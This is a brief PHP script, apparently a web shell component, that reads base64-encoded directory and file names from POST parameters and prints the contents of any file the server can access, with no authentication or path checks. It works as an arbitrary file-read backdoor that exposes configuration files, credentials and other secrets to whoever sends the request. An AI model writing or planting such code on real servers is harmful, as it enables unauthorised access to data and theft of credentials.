<?php

$pth = base64_decode($_POST['d_pth']);
chdir($pth);
$file = base64_decode($_POST['d_file']);
$dat = file_get_contents($file);
echo ($dat);
exit;
